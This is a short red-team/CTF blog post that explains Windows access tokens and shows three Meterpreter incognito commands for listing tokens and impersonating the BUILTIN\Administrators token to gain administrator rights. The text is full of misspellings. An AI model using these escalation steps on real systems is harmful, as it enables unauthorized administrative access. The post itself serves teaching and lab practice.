---
layout: post
title:  "Token Imporsanate With Meterpreter Shell"
date:   2020-04-09 02:24:32 +0530
categories: redteam ctf
---

Token imporsanation is a windows privilage escalation technique. This blog discusses about how windows tokens work and how tokens can be used to escalate 
privilages into administrator account.

## What is a Token

When a user login to the windows system through physically or through a remote desktop, the os create a token and keep it in memory until the user disconnect or log off or 
computer reboot. Tokens are like cookies for windows. It holds the information about use authorization.

There are two types of Tokens exists,
<ol>
<li>Delegate - Created in an interactive login such as conventionally logging into the console, logging in remotely using Terminal Services
or using other remote access solutions such as Citrix.</li> 
<li>Imporsonate - Created in non-interactive login such as ftp server login, apache server login.</li>
</ol>

If the SeImpoersonate privilage is enable we can imporsanate any user through his token,

## Attack Using Meterpreter Shell

First we need to load incognito module,
```
load incognito
```
List All the tokens 
```
list_tokens -g
```
![List the tokens](https://raw.githubusercontent.com/janithmalinga/janithmalinga.github.io/master/_images/_imporsanate/list_token.png)


#### Then we can imporsanate the administrator using administrator token

```
impersonate_token "BUILTIN\Administrators"
```
![Imporsanate the administrator token](https://github.com/janithmalinga/janithmalinga.github.io/blob/master/_images/_imporsanate/imposanate_admin.png?raw=true)
